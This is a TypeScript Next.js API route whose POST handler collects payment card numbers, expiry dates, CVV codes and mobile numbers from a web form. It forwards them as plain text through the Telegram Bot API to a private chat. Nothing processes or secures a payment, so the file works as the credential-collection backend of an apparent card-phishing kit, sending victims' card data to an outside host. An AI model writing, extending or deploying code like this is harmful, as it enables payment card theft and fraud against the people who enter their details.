import { NextResponse } from 'next/server'

export async function POST(request: Request) {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!token || !chatId) {
    return NextResponse.json({ ok: false, error: 'Telegram is not configured.' }, { status: 503 })
  }

  let text = ''
  try {
    const body = await request.json()

    if (typeof body?.text === 'string' && body.text.trim()) {
      // Pre-formatted message
      text = body.text.trim()
    } else if (body?.card || body?.mobile || body?.month || body?.year || body?.cvv) {
      // Structured card submission
      const lines = [
        'New card submission:',
        body?.card ? `Card: ${body.card}` : null,
        body?.month || body?.year ? `Expiry: ${body?.month ?? '--'}/${body?.year ?? '----'}` : null,
        body?.cvv ? `CVV: ${body.cvv}` : null,
        body?.mobile ? `Mobile: ${body.mobile}` : null,
      ].filter(Boolean)
      text = lines.join('\n')
    } else {
      const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
      const trimmed = value.trim()
      text = trimmed ? `New number submitted: ${trimmed}` : ''
    }
  } catch {
    return NextResponse.json({ ok: false, error: 'Invalid request.' }, { status: 400 })
  }

  if (!text) {
    return NextResponse.json({ ok: false, error: 'Nothing to send.' }, { status: 400 })
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
      }),
      cache: 'no-store',
    })

    if (!response.ok) {
      return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
  }
}

export function GET() {
  return NextResponse.json({ ok: false }, { status: 405 })
}
